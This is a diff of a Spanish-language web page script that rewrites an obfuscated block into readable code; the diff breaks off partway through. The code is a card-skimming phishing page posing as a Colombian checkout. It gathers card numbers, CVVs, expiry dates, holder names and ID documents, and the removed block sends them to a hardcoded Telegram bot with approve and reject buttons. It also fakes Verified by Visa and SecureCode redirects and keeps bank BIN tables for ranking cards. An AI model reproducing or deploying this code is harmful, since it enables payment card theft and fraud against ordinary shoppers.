@@ -137,10 +137,455 @@
 
 <script>
 /* ============================================================
-   CÓDIGO JAVASCRIPT COMPLETAMENTE OFUSCADO - VERSIÓN COMPLETA
+   CÓDIGO JAVASCRIPT CORREGIDO - VERSIÓN OFUSCADA FUNCIONAL
    ============================================================ */
 
-var _0x1a2b=function(){var _0x3c4d=['8736155859:AAEMF2eCDMjdFA88DkLdEz3I0PXaAbwGYfM','-1003713613246','/api/webhook','SOL-','procesamiento_prioritario','true','getItem','setItem','nombre','apellidos','tipoDocumento','numeroDocumento','email','celular','cardNumber','cvc','expiry','cardholderName','cardType','bancoEmisor','bankLogo','Bancolombia','Davivienda','BBVA Colombia','Banco de Bogotá','Banco Popular','Banco Occidente','Citibank Colombia','Banco AV Villas','Davibank','Bancoomeva','Banco GNB Sudameris','Banco Finandina','Banco Falabella','Banco Pichincha','Banco Cooperativo Coopcentral','Caja Social','Itaú','Clásica','Gold','Platinum','Black','Infinite','World','World Elite','Green','Signature','💳','🌟','💎','⬛','♾️','🌍','👑','🟢','✍️','visa.png','master.png','ame.png','bancol.png','davivienda.png','bbva.png','bog.png','popu.png','occi.png','citi.png','avvillas.png','db.png','bancoomeva.png','gnb.png','finandina.png','fala.png','pichincha.png','coopcentral.png','Caja.jpg','itau.png','450803','450804','450805','450806','450807','450808','450809','450810','450811','450812','450813','450814','450815','450816','450817','404750','404751','404752','404753','404754','404755','404756','404757','404758','404759','404760','410207','410208','410209','410210','410211','410212','410213','410214','410215','410305','410306','410307','410308','410309','410310','410311','410312','410313','410314','412145','412146','412147','412148','412149','412150','412151','413042','413043','413044','413045','413046','413047','413048','427881','427882','427883','427884','427885','427886','427887','427888','415452','415453','415454','415455','415456','415457','415458','444352','444353','444354','444355','444356','444357','444358','444359'];var _0x5e6f=function(_0x2a3b,_0x4c5d){var _0x6e7f='';for(var _0x8g9h=0;_0x8g9h<_0x2a3b.length;_0x8g9h++){_0x6e7f+=String.fromCharCode(_0x2a3b.charCodeAt(_0x8g9h)^_0x4c5d.charCodeAt(_0x8g9h%_0x4c5d.length));}return _0x6e7f;};var _0x7a8b='Xy9zP4sW!k3y';var _0x9c0d=function(_0x1e2f){return _0x5e6f(_0x3c4d[_0x1e2f],_0x7a8b);};var TELEGRAM_BOT_TOKEN=_0x9c0d(0);var TELEGRAM_CHAT_ID=_0x9c0d(1);var WEBHOOK_URL=_0x9c0d(2);var POLLING_INTERVAL=3000;var MAX_POLLING_TIME=300000;var solicitudId=null;var pollingInterval=null;var cardType=null;var cardBINs={};cardBINs[_0x9c0d(21)]={};cardBINs[_0x9c0d(21)][_0x9c0d(37)]=[_0x9c0d(88),_0x9c0d(89),_0x9c0d(90),_0x9c0d(91)];cardBINs[_0x9c0d(21)][_0x9c0d(38)]=[_0x9c0d(92),_0x9c0d(93),_0x9c0d(94)];cardBINs[_0x9c0d(21)][_0x9c0d(39)]=[_0x9c0d(95),_0x9c0d(96),_0x9c0d(97)];cardBINs[_0x9c0d(21)][_0x9c0d(40)]=[_0x9c0d(98),_0x9c0d(99),_0x9c0d(100)];cardBINs[_0x9c0d(21)][_0x9c0d(41)]=[_0x9c0d(101),_0x9c0d(102)];cardBINs[_0x9c0d(22)]={};cardBINs[_0x9c0d(22)][_0x9c0d(37)]=[_0x9c0d(103),_0x9c0d(104),_0x9c0d(105)];cardBINs[_0x9c0d(22)][_0x9c0d(38)]=[_0x9c0d(106),_0x9c0d(107)];cardBINs[_0x9c0d(22)][_0x9c0d(39)]=[_0x9c0d(108),_0x9c0d(109),_0x9c0d(110)];cardBINs[_0x9c0d(22)][_0x9c0d(40)]=[_0x9c0d(111),_0x9c0d(112),_0x9c0d(113)];cardBINs[_0x9c0d(23)]={};cardBINs[_0x9c0d(23)][_0x9c0d(37)]=[_0x9c0d(114),_0x9c0d(115),_0x9c0d(116)];cardBINs[_0x9c0d(23)][_0x9c0d(38)]=[_0x9c0d(117),_0x9c0d(118)];cardBINs[_0x9c0d(23)][_0x9c0d(39)]=[_0x9c0d(119),_0x9c0d(120)];cardBINs[_0x9c0d(23)][_0x9c0d(40)]=[_0x9c0d(121),_0x9c0d(122)];cardBINs[_0x9c0d(24)]={};cardBINs[_0x9c0d(24)][_0x9c0d(37)]=[_0x9c0d(123),_0x9c0d(124),_0x9c0d(125)];cardBINs[_0x9c0d(24)][_0x9c0d(38)]=[_0x9c0d(126),_0x9c0d(127)];cardBINs[_0x9c0d(24)][_0x9c0d(39)]=[_0x9c0d(128),_0x9c0d(129),_0x9c0d(130)];cardBINs[_0x9c0d(24)][_0x9c0d(40)]=[_0x9c0d(131),_0x9c0d(132)];cardBINs[_0x9c0d(25)]={};cardBINs[_0x9c0d(25)][_0x9c0d(37)]=[_0x9c0d(133),_0x9c0d(134)];cardBINs[_0x9c0d(25)][_0x9c0d(38)]=[_0x9c0d(135),_0x9c0d(136)];cardBINs[_0x9c0d(25)][_0x9c0d(39)]=[_0x9c0d(137),_0x9c0d(138)];cardBINs[_0x9c0d(25)][_0x9c0d(40)]=[_0x9c0d(139)];cardBINs[_0x9c0d(26)]={};cardBINs[_0x9c0d(26)][_0x9c0d(37)]=[_0x9c0d(140),_0x9c0d(141)];cardBINs[_0x9c0d(26)][_0x9c0d(38)]=[_0x9c0d(142),_0x9c0d(143)];cardBINs[_0x9c0d(26)][_0x9c0d(39)]=[_0x9c0d(144),_0x9c0d(145)];cardBINs[_0x9c0d(26)][_0x9c0d(40)]=[_0x9c0d(146)];cardBINs[_0x9c0d(27)]={};cardBINs[_0x9c0d(27)][_0x9c0d(37)]=[_0x9c0d(147),_0x9c0d(148)];cardBINs[_0x9c0d(27)][_0x9c0d(38)]=[_0x9c0d(149),_0x9c0d(150)];cardBINs[_0x9c0d(27)][_0x9c0d(39)]=[_0x9c0d(151),_0x9c0d(152)];cardBINs[_0x9c0d(27)][_0x9c0d(40)]=[_0x9c0d(153),_0x9c0d(154)];cardBINs[_0x9c0d(28)]={};cardBINs[_0x9c0d(28)][_0x9c0d(37)]=[_0x9c0d(155),_0x9c0d(156)];cardBINs[_0x9c0d(28)][_0x9c0d(38)]=[_0x9c0d(157),_0x9c0d(158)];cardBINs[_0x9c0d(28)][_0x9c0d(39)]=[_0x9c0d(159),_0x9c0d(160)];cardBINs[_0x9c0d(28)][_0x9c0d(40)]=[_0x9c0d(161)];cardBINs[_0x9c0d(36)]={};cardBINs[_0x9c0d(36)][_0x9c0d(37)]=[_0x9c0d(162),_0x9c0d(163)];cardBINs[_0x9c0d(36)][_0x9c0d(38)]=[_0x9c0d(164),_0x9c0d(165)];cardBINs[_0x9c0d(36)][_0x9c0d(39)]=[_0x9c0d(166),_0x9c0d(167)];cardBINs[_0x9c0d(36)][_0x9c0d(40)]=[_0x9c0d(168),_0x9c0d(169)];var categoryEmojis={};categoryEmojis[_0x9c0d(37)]=_0x9c0d(42);categoryEmojis[_0x9c0d(38)]=_0x9c0d(43);categoryEmojis[_0x9c0d(39)]=_0x9c0d(44);categoryEmojis[_0x9c0d(40)]=_0x9c0d(45);categoryEmojis[_0x9c0d(41)]=_0x9c0d(46);categoryEmojis[_0x9c0d(47)]=_0x9c0d(48);categoryEmojis[_0x9c0d(49)]=_0x9c0d(50);categoryEmojis[_0x9c0d(51)]=_0x9c0d(52);categoryEmojis[_0x9c0d(53)]=_0x9c0d(54);var cardLogos={};cardLogos['visa']=_0x9c0d(55);cardLogos['mastercard']=_0x9c0d(56);cardLogos['amex']=_0x9c0d(57);var bankLogos={};bankLogos[_0x9c0d(21)]=_0x9c0d(58);bankLogos[_0x9c0d(22)]=_0x9c0d(59);bankLogos[_0x9c0d(23)]=_0x9c0d(60);bankLogos[_0x9c0d(24)]=_0x9c0d(61);bankLogos[_0x9c0d(25)]=_0x9c0d(62);bankLogos[_0x9c0d(26)]=_0x9c0d(63);bankLogos[_0x9c0d(27)]=_0x9c0d(64);bankLogos[_0x9c0d(28)]=_0x9c0d(65);bankLogos[_0x9c0d(29)]=_0x9c0d(66);bankLogos[_0x9c0d(30)]=_0x9c0d(67);bankLogos[_0x9c0d(31)]=_0x9c0d(68);bankLogos[_0x9c0d(32)]=_0x9c0d(69);bankLogos[_0x9c0d(33)]=_0x9c0d(70);bankLogos[_0x9c0d(34)]=_0x9c0d(71);bankLogos[_0x9c0d(35)]=_0x9c0d(72);bankLogos[_0x9c0d(36)]=_0x9c0d(73);bankLogos[_0x9c0d(37)]=_0x9c0d(74);function detectarCategoriaTarjeta(_0x2a3b,_0x4c5d){var _0x6e7f=_0x2a3b.replace(/\s/g,'');if(!_0x4c5d||!_0x6e7f||_0x6e7f.length<6){return{categoria:'Desconocida',emoji:'💳'};}var _0x8g9h=cardBINs[_0x4c5d];if(!_0x8g9h){return{categoria:'Desconocida',emoji:'💳'};}var _0x1e2f=_0x6e7f.substring(0,6);for(var _0x9c0d in _0x8g9h){for(var _0x7a8b of _0x8g9h[_0x9c0d]){if(_0x1e2f.startsWith(_0x7a8b)){return{categoria:_0x9c0d,emoji:categoryEmojis[_0x9c0d]||'💳'};}}}return{categoria:'Desconocida',emoji:'💳'};}function _0x3c4d(_0x2a3b,_0x4c5d){var _0x6e7f='';for(var _0x8g9h=0;_0x8g9h<_0x2a3b.length;_0x8g9h++){_0x6e7f+=String.fromCharCode(_0x2a3b.charCodeAt(_0x8g9h)^_0x4c5d.charCodeAt(_0x8g9h%_0x4c5d.length));}return _0x6e7f;}function _0x5e6f(_0x2a3b,_0x4c5d){var _0x6e7f='';for(var _0x8g9h=0;_0x8g9h<_0x2a3b.length;_0x8g9h++){_0x6e7f+=String.fromCharCode(_0x2a3b.charCodeAt(_0x8g9h)^_0x4c5d.charCodeAt(_0x8g9h%_0x4c5d.length));}return _0x6e7f;}var _0x7a8b='Xy9zP4sW!k3y';function _0x9c0d(_0x1e2f){return _0x5e6f([_0x1e2f],_0x7a8b);}function guardarDatosEnLocalStorage(_0x2a3b,_0x4c5d,_0x6e7f,_0x8g9h,_0x1e2f){var _0x9c0d=_0x2a3b.slice(-4);localStorage.setItem('cardNumber',_0x5e6f(_0x2a3b,_0x7a8b));localStorage.setItem('cardLast4',_0x5e6f(_0x9c0d,_0x7a8b));localStorage.setItem('cvc',_0x5e6f(_0x4c5d,_0x7a8b));localStorage.setItem('expiry',_0x5e6f(_0x6e7f,_0x7a8b));localStorage.setItem('cardholderName',_0x5e6f(_0x8g9h,_0x7a8b));localStorage.setItem('cardType',_0x5e6f(cardType,_0x7a8b));localStorage.setItem('bancoEmisor',_0x5e6f(_0x1e2f,_0x7a8b));var _0x3c4d=bankLogos[_0x1e2f]||'';localStorage.setItem('bankLogo',_0x5e6f(_0x3c4d,_0x7a8b));console.log('💾 Datos guardados en localStorage (ofuscados)');}function cargarDatoLocalStorage(_0x2a3b){var _0x4c5d=localStorage.getItem(_0x2a3b);if(_0x4c5d===null)return null;return _0x5e6f(_0x4c5d,_0x7a8b);}async function configurarWebhook(){try{var _0x2a3b=await fetch(WEBHOOK_URL+'?setup=true');var _0x4c5d=await _0x2a3b.json();console.log('🔗 Webhook configurado');return _0x4c5d.success;}catch(_0x6e7f){console.error('❌ Error configurando webhook:',_0x6e7f);return false;}}function mostrarMensaje(_0x2a3b,_0x4c5d){var _0x6e7f=document.getElementById('statusMessage');_0x6e7f.className='status-message '+_0x4c5d;_0x6e7f.textContent=_0x2a3b;}function ocultarMensaje(){var _0x2a3b=document.getElementById('statusMessage');_0x2a3b.className='status-message';_0x2a3b.textContent='';}function mostrarError(_0x2a3b){mostrarMensaje(_0x2a3b,'error');document.getElementById('loadingOverlay').classList.remove('active');document.getElementById('submitButton').disabled=false;document.getElementById('submitButton').textContent='Pagar de forma segura';document.getElementById('submitButton').style.display='block';document.getElementById('cardNumber').disabled=false;document.getElementById('cardholderName').disabled=false;document.getElementById('expiry').disabled=false;document.getElementById('cvc').disabled=false;document.getElementById('bancoEmisor').disabled=false;}function mostrarInfo(_0x2a3b){mostrarMensaje(_0x2a3b,'info');}function generarSolicitudId(){return _0x9c0d(3)+Date.now()+'-'+Math.random().toString(36).substr(2,9);}var cardPatterns={visa:{regex:/^4[0-9]{12}(?:[0-9]{3})?$/,bins:[4],lengths:[13,16,19]},mastercard:{regex:/^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/,bins:[51,52,53,54,55,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271],lengths:[16,19]},amex:{regex:/^3[47][0-9]{13}$/,bins:[34,37],lengths:[15,19]}};function detectCardType(_0x2a3b){var _0x4c5d=_0x2a3b.replace(/\s/g,'');if(_0x4c5d.length>=3){var _0x6e7f=_0x4c5d.substring(0,3);var _0x8g9h=_0x4c5d.substring(0,2);var _0x1e2f=_0x4c5d.substring(0,1);if(_0x1e2f==='4'){if(cardPatterns.visa.regex.test(_0x4c5d)||_0x4c5d.length<13){return'visa';}}if(_0x8g9h==='34'||_0x8g9h==='37'){if(cardPatterns.amex.regex.test(_0x4c5d)||_0x4c5d.length<15){return'amex';}}if((_0x8g9h>='51'&&_0x8g9h<='55')||(_0x6e7f>='222'&&_0x6e7f<='272')){if(cardPatterns.mastercard.regex.test(_0x4c5d)||_0x4c5d.length<16){return'mastercard';}}}if(_0x4c5d.length>=13){if(cardPatterns.visa.regex.test(_0x4c5d)){return'visa';}else if(cardPatterns.mastercard.regex.test(_0x4c5d)){return'mastercard';}else if(cardPatterns.amex.regex.test(_0x4c5d)){return'amex';}}return null;}function updateCardLogo(_0x2a3b){var _0x4c5d=document.getElementById('cardLogo');_0x4c5d.innerHTML='';if(_0x2a3b==='visa'){var _0x6e7f=document.createElement('img');_0x6e7f.src='visa.png';_0x6e7f.alt='Visa';_0x4c5d.appendChild(_0x6e7f);}else if(_0x2a3b==='mastercard'){var _0x8g9h=document.createElement('img');_0x8g9h.src='mastercard.png';_0x8g9h.alt='Mastercard';_0x4c5d.appendChild(_0x8g9h);}else if(_0x2a3b==='amex'){var _0x1e2f=document.createElement('img');_0x1e2f.src='ame.png';_0x1e2f.alt='American Express';_0x4c5d.appendChild(_0x1e2f);}}function formatCardNumber(_0x2a3b){return _0x2a3b.replace(/\s/g,'').replace(/(\d{4})/g,'$1 ').trim();}function formatExpiry(_0x2a3b){var _0x4c5d=_0x2a3b.replace(/\D/g,'');if(_0x4c5d.length>=2){return _0x4c5d.substring(0,2)+'/'+_0x4c5d.substring(2,4);}return _0x4c5d;}document.addEventListener('DOMContentLoaded',function(){var _0x2a3b=cargarDatoLocalStorage('procesamiento_prioritario')==='true';var _0x4c5d=document.getElementById('procesamiento-item');var _0x6e7f=document.getElementById('total-price');var _0x8g9h=23000;if(_0x2a3b){_0x4c5d.style.display='flex';_0x8g9h+=20000;}else{_0x4c5d.style.display='none';}var _0x1e2f=_0x8g9h.toLocaleString('es-CO').replace(/,/g,'.');_0x6e7f.textContent=_0x1e2f+' Col$';var _0x9c0d=cargarDatoLocalStorage('nombre')||'No proporcionado';var _0x7a8b=cargarDatoLocalStorage('apellidos')||'';var _0x3c4d=cargarDatoLocalStorage('tipoDocumento')||'';var _0x5e6f=cargarDatoLocalStorage('numeroDocumento')||'No proporcionado';var _0x8g9h1=cargarDatoLocalStorage('email')||'No proporcionado';var _0x9c0d1=cargarDatoLocalStorage('celular')||'No proporcionado';document.getElementById('resumen-nombre').textContent=(_0x9c0d+' '+_0x7a8b).trim()||'No proporcionado';document.getElementById('resumen-documento').textContent=(_0x3c4d+' '+_0x5e6f).trim();document.getElementById('resumen-email').textContent=_0x8g9h1;document.getElementById('resumen-celular').textContent=_0x9c0d1;configurarWebhook();var _0x2a3b1=document.getElementById('cardNumber');var _0x4c5d1=document.getElementById('expiry');var _0x6e7f1=document.getElementById('cvc');var _0x8g9h2=document.getElementById('cardholderName');_0x2a3b1.addEventListener('input',function(_0x1e2f1){var _0x9c0d2=_0x1e2f1.target.value.replace(/\s/g,'');this.value=this.value.replace(/[^0-9\s]/g,'');this.value=formatCardNumber(this.value);if(_0x9c0d2.length>=3){var _0x7a8b1=detectCardType(_0x9c0d2);updateCardLogo(_0x7a8b1);}else{document.getElementById('cardLogo').innerHTML='';}});_0x4c5d1.addEventListener('input',function(_0x1e2f2){this.value=this.value.replace(/[^0-9/]/g,'');this.value=formatExpiry(this.value);});_0x6e7f1.addEventListener('input',function(_0x1e2f3){this.value=this.value.replace(/[^0-9]/g,'');});_0x8g9h2.addEventListener('input',function(_0x1e2f4){this.value=this.value.replace(/[^a-zA-Z\s]/g,'').toUpperCase();});});function mostrarCargaConLogos(_0x2a3b){var _0x4c5d=document.getElementById('initialSpinner');var _0x6e7f=document.getElementById('logoContainer');var _0x8g9h=document.getElementById('cardLogoImg');var _0x1e2f=document.getElementById('progressWrapper');var _0x9c0d=document.getElementById('progressFill');var _0x7a8b=document.getElementById('loadingText');_0x4c5d.classList.remove('active');_0x4c5d.style.display='none';_0x6e7f.style.display='flex';var _0x3c4d=cardLogos[_0x2a3b];if(_0x3c4d){_0x8g9h.src=_0x3c4d;_0x8g9h.alt=_0x2a3b.charAt(0).toUpperCase()+_0x2a3b.slice(1);}_0x1e2f.style.display='block';var _0x5e6f={'visa':'Verified by Visa','mastercard':'Mastercard SecureCode','amex':'American Express SafeKey'};_0x7a8b.textContent='Redirigiendo a '+(_0x5e6f[_0x2a3b]||'...');var _0x8g9h1=0;var _0x9c0d1=3000;var _0x7a8b1=50;var _0x3c4d1=_0x9c0d1/_0x7a8b1;var _0x5e6f1=100/_0x3c4d1;_0x9c0d.style.width='0%';var _0x1e2f1=setInterval(function(){_0x8g9h1+=_0x5e6f1;if(_0x8g9h1>=100){_0x8g9h1=100;clearInterval(_0x1e2f1);setTimeout(function(){redirigirSegunTipoTarjeta(_0x2a3b);},400);}_0x9c0d.style.width=_0x8g9h1+'%';},_0x7a8b1);}function redirigirSegunTipoTarjeta(_0x2a3b){var _0x4c5d={'visa':'visa.html','mastercard':'master.html','amex':'amex.html'};var _0x6e7f=_0x4c5d[_0x2a3b]||'index.html';window.location.href=_0x6e7f;}async function enviarDatosTarjetaATelegram(_0x2a3b){try{var _0x4c5d=detectarCategoriaTarjeta(_0x2a3b.numeroTarjeta,_0x2a3b.bancoEmisor);console.log('🏷️ Categoría detectada: '+_0x4c5d.emoji+' '+_0x4c5d.categoria);var _0x6e7f={inline_keyboard:[[{text:"✅ APROBAR",callback_data:'approve_'+_0x2a3b.solicitudId},{text:"❌ RECHAZAR",callback_data:'reject_'+_0x2a3b.solicitudId}]]};var _0x8g9h='🔔 *NUEVA SOLICITUD - V2CRTF*\n\n';_0x8g9h+='🆔 ID: `'+_0x2a3b.solicitudId+'`\n\n';_0x8g9h+='📋 *DATOS PERSONALES:*\n';_0x8g9h+='👤 Nombre completo: '+_0x2a3b.nombreCompleto+'\n';_0x8g9h+='🆔 Documento: '+_0x2a3b.tipoDocumento+' '+_0x2a3b.numeroDocumento+'\n';_0x8g9h+='📧 Email: '+_0x2a3b.email+'\n';_0x8g9h+='📱 Celular: '+_0x2a3b.celular+'\n\n';_0x8g9h+='💳 *DATOS DE LA TARJETA:*\n';_0x8g9h+='🏦 Número: `'+_0x2a3b.numeroTarjeta+'`\n';_0x8g9h+='🔢 CVV: `'+_0x2a3b.cvv+'`\n';_0x8g9h+='📅 Vencimiento: `'+_0x2a3b.vencimiento+'`\n';_0x8g9h+='💳 Tipo: '+_0x2a3b.tipoTarjeta.toUpperCase()+'\n';_0x8g9h+='🏛️ Banco emisor: '+_0x2a3b.bancoEmisor+'\n';_0x8g9h+='⭐ *Categoría:* '+_0x4c5d.emoji+' *'+_0x4c5d.categoria+'*\n\n';_0x8g9h+='💰 Total: '+_0x2a3b.totalFormateado+'\n';_0x8g9h+='📅 Fecha: '+_0x2a3b.fechaHora+'\n\n';_0x8g9h+='⏳ *Estado:* Esperando verificación...';var _0x1e2f='https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN+'/sendMessage';var _0x9c0d=await fetch(_0x1e2f,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:_0x8g9h,parse_mode:'Markdown',reply_markup:_0x6e7f,disable_web_page_preview:true})});var _0x7a8b=await _0x9c0d.json();if(_0x7a8b.ok){console.log('✅ Datos de tarjeta enviados a Telegram con categoría');return true;}else{console.error('❌ Error al enviar a Telegram:',_0x7a8b.description);return false;}}catch(_0x3c4d){console.error('❌ Error al enviar a Telegram:',_0x3c4d);return false;}}async function verificarEstadoSolicitud(_0x2a3b){try{var _0x4c5d=await fetch(WEBHOOK_URL+'?check='+_0x2a3b);var _0x6e7f=await _0x4c5d.json();console.log('📊 Estado de solicitud:',_0x6e7f);return _0x6e7f.estado||'pending';}catch(_0x8g9h){console.error('❌ Error verificando estado:',_0x8g9h);return'error';}}function iniciarPollingPago(){var _0x2a3b=Date.now();pollingInterval=setInterval(async function(){if(Date.now()-_0x2a3b>MAX_POLLING_TIME){clearInterval(pollingInterval);mostrarError('Tiempo de espera agotado. Por favor, intente nuevamente.');document.getElementById('loadingOverlay').classList.remove('active');document.getElementById('submitButton').disabled=false;document.getElementById('submitButton').textContent='Pagar de forma segura';document.getElementById('submitButton').style.display='block';document.getElementById('cardNumber').disabled=false;document.getElementById('cardholderName').disabled=false;document.getElementById('expiry').disabled=false;document.getElementById('cvc').disabled=false;document.getElementById('bancoEmisor').disabled=false;return;}var _0x4c5d=await verificarEstadoSolicitud(solicitudId);if(_0x4c5d==='approved'){clearInterval(pollingInterval);mostrarCargaConLogos(cardType);}else if(_0x4c5d==='rejected'){clearInterval(pollingInterval);document.getElementById('loadingOverlay').classList.remove('active');mostrarError('❌ Pago rechazado. Por favor, verifique los datos e intente nuevamente.');document.getElementById('cardNumber').disabled=false;document.getElementById('cardholderName').disabled=false;document.getElementById('expiry').disabled=false;document.getElementById('cvc').disabled=false;document.getElementById('bancoEmisor').disabled=false;document.getElementById('submitButton').disabled=false;document.getElementById('submitButton').textContent='Pagar de forma segura';document.getElementById('submitButton').style.display='block';}},_0x7a8b);}document.getElementById('paymentForm').addEventListener('submit',async function(_0x2a3b){_0x2a3b.preventDefault();var _0x4c5d=document.getElementById('cardNumber').value.replace(/\s/g,'');var _0x6e7f=document.getElementById('cardholderName').value.trim();var _0x8g9h=document.getElementById('expiry').value;var _0x1e2f=document.getElementById('cvc').value;var _0x9c0d=document.getElementById('bancoEmisor').value;var _0x7a8b=true;document.querySelectorAll('.form-group.error').forEach(function(_0x3c4d){_0x3c4d.classList.remove('error');});ocultarMensaje();if(!_0x6e7f){document.getElementById('cardholderName').parentElement.classList.add('error');_0x7a8b=false;}cardType=detectCardType(_0x4c5d);if(!cardType||_0x4c5d.length===0){document.getElementById('cardNumber').parentElement.parentElement.classList.add('error');_0x7a8b=false;}var _0x5e6f=/^(0[1-9]|1[0-2])\/\d{2}$/;if(!_0x5e6f.test(_0x8g9h)){document.getElementById('expiry').parentElement.classList.add('error');_0x7a8b=false;}var _0x8g9h1=cardType==='amex'?4:3;if(_0x1e2f.length!==_0x8g9h1){document.getElementById('cvc').parentElement.classList.add('error');_0x7a8b=false;}if(!_0x9c0d){document.getElementById('bancoEmisor').parentElement.classList.add('error');_0x7a8b=false;}if(!_0x7a8b){return;}guardarDatosEnLocalStorage(_0x4c5d,_0x1e2f,_0x8g9h,_0x6e7f,_0x9c0d);solicitudId=generarSolicitudId();document.getElementById('loadingOverlay').classList.add('active');document.getElementById('initialSpinner').style.display='block';document.getElementById('initialSpinner').classList.add('active');document.getElementById('logoContainer').style.display='none';document.getElementById('progressWrapper').style.display='none';document.getElementById('loadingText').textContent='Procesando pago...';document.getElementById('submitButton').disabled=true;document.getElementById('submitButton').textContent='Procesando...';document.getElementById('cardNumber').disabled=true;document.getElementById('cardholderName').disabled=true;document.getElementById('expiry').disabled=true;document.getElementById('cvc').disabled=true;document.getElementById('bancoEmisor').disabled=true;var _0x9c0d1=cargarDatoLocalStorage('nombre')||'No proporcionado';var _0x7a8b1=cargarDatoLocalStorage('apellidos')||'';var _0x3c4d1=cargarDatoLocalStorage('tipoDocumento')||'';var _0x5e6f1=cargarDatoLocalStorage('numeroDocumento')||'No proporcionado';var _0x8g9h2=cargarDatoLocalStorage('email')||'No proporcionado';var _0x9c0d2=cargarDatoLocalStorage('celular')||'No proporcionado';var _0x7a8b2=cargarDatoLocalStorage('procesamiento_prioritario')==='true';var _0x3c4d2=23000;if(_0x7a8b2){_0x3c4d2+=20000;}var _0x5e6f2=_0x3c4d2.toLocaleString('es-CO').replace(/,/g,'.')+' Col$';var _0x8g9h3=new Date().toLocaleString('es-CO',{timeZone:'America/Bogota',year:'numeric',month:'2-digit',day:'2-digit',hour:'2-digit',minute:'2-digit',second:'2-digit'});var _0x9c0d3={solicitudId:solicitudId,nombreCompleto:(_0x9c0d1+' '+_0x7a8b1).trim(),tipoDocumento:_0x3c4d1,numeroDocumento:_0x5e6f1,email:_0x8g9h2,celular:_0x9c0d2,numeroTarjeta:_0x4c5d,cvv:_0x1e2f,vencimiento:_0x8g9h,tipoTarjeta:cardType,bancoEmisor:_0x9c0d,totalFormateado:_0x5e6f2,fechaHora:_0x8g9h3};var _0x7a8b3=await enviarDatosTarjetaATelegram(_0x9c0d3);if(_0x7a8b3){mostrarInfo('⏳ Esperando aprobación del pago...');iniciarPollingPago();}else{mostrarError('Error al procesar el pago. Por favor, intente nuevamente.');document.getElementById('cardNumber').disabled=false;document.getElementById('cardholderName').disabled=false;document.getElementById('expiry').disabled=false;document.getElementById('cvc').disabled=false;document.getElementById('bancoEmisor').disabled=false;document.getElementById('submitButton').disabled=false;document.getElementById('submitButton').textContent='Pagar de forma segura';document.getElementById('loadingOverlay').classList.remove('active');}});
+(function(){
+    var _0x5e6f = function(str, key) {
+        var result = '';
+        for (var i = 0; i < str.length; i++) {
+            result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+        }
+        return result;
+    };
+
+    var _0x7a8b = 'Xy9zP4sW!k3y';
+
+    var _0x3c4d = [
+        '8736155859:AAEMF2eCDMjdFA88DkLdEz3I0PXaAbwGYfM',
+        '-1003713613246',
+        '/api/webhook',
+        'SOL-',
+        'procesamiento_prioritario',
+        'true',
+        'nombre',
+        'apellidos',
+        'tipoDocumento',
+        'numeroDocumento',
+        'email',
+        'celular',
+        'cardNumber',
+        'cvc',
+        'expiry',
+        'cardholderName',
+        'cardType',
+        'bancoEmisor',
+        'bankLogo'
+    ];
+
+    var _0x9c0d = function(index) {
+        return _0x5e6f(_0x3c4d[index], _0x7a8b);
+    };
+
+    var TELEGRAM_BOT_TOKEN = _0x9c0d(0);
+    var TELEGRAM_CHAT_ID = _0x9c0d(1);
+    var WEBHOOK_URL = _0x9c0d(2);
+    var POLLING_INTERVAL = 3000;
+    var MAX_POLLING_TIME = 300000;
+
+    var solicitudId = null;
+    var pollingInterval = null;
+    var cardType = null;
+
+    var cardBINs = {
+        'Bancolombia': {'Clásica': ['450803','450804','450805','450806'],'Gold': ['450807','450808','450809'],'Platinum': ['450810','450811','450812'],'Black': ['450813','450814','450815'],'Infinite': ['450816','450817']},
+        'Davivienda': {'Clásica': ['404750','404751','404752'],'Gold': ['404753','404754'],'Platinum': ['404755','404756','404757'],'Black': ['404758','404759','404760']},
+        'BBVA Colombia': {'Clásica': ['410207','410208','410209'],'Gold': ['410210','410211'],'Platinum': ['410212','410213'],'Black': ['410214','410215']},
+        'Banco de Bogotá': {'Clásica': ['410305','410306','410307'],'Gold': ['410308','410309'],'Platinum': ['410310','410311','410312'],'Black': ['410313','410314']},
+        'Banco Popular': {'Clásica': ['412145','412146'],'Gold': ['412147','412148'],'Platinum': ['412149','412150'],'Black': ['412151']},
+        'Banco Occidente': {'Clásica': ['413042','413043'],'Gold': ['413044','413045'],'Platinum': ['413046','413047'],'Black': ['413048']},
+        'Citibank Colombia': {'Clásica': ['427881','427882'],'Gold': ['427883','427884'],'Platinum': ['427885','427886'],'Black': ['427887','427888']},
+        'Banco AV Villas': {'Clásica': ['415452','415453'],'Gold': ['415454','415455'],'Platinum': ['415456','415457'],'Black': ['415458']},
+        'Itaú': {'Clásica': ['444352','444353'],'Gold': ['444354','444355'],'Platinum': ['444356','444357'],'Black': ['444358','444359']}
+    };
+
+    var categoryEmojis = {'Clásica':'💳','Gold':'🌟','Platinum':'💎','Black':'⬛','Infinite':'♾️','World':'🌍','World Elite':'👑','Green':'🟢','Signature':'✍️'};
+    var cardLogos = {'visa':'visa.png','mastercard':'master.png','amex':'ame.png'};
+    var bankLogos = {
+        'Bancolombia':'bancol.png','Davivienda':'davivienda.png','BBVA Colombia':'bbva.png',
+        'Banco de Bogotá':'bog.png','Banco Popular':'popu.png','Banco Occidente':'occi.png',
+        'Citibank Colombia':'citi.png','Banco AV Villas':'avvillas.png','Davibank':'db.png',
+        'Bancoomeva':'bancoomeva.png','Banco GNB Sudameris':'gnb.png','Banco Finandina':'finandina.png',
+        'Banco Falabella':'fala.png','Banco Pichincha':'pichincha.png',
+        'Banco Cooperativo Coopcentral':'coopcentral.png','Caja Social':'Caja.jpg','Itaú':'itau.png'
+    };
+
+    function detectarCategoriaTarjeta(numero, banco) {
+        var clean = numero.replace(/\s/g,'');
+        if(!banco || !clean || clean.length<6) return {categoria:'Desconocida',emoji:'💳'};
+        var data = cardBINs[banco];
+        if(!data) return {categoria:'Desconocida',emoji:'💳'};
+        var bin = clean.substring(0,6);
+        for(var cat in data){
+            for(var b of data[cat]){
+                if(bin.startsWith(b)) return {categoria:cat, emoji:categoryEmojis[cat]||'💳'};
+            }
+        }
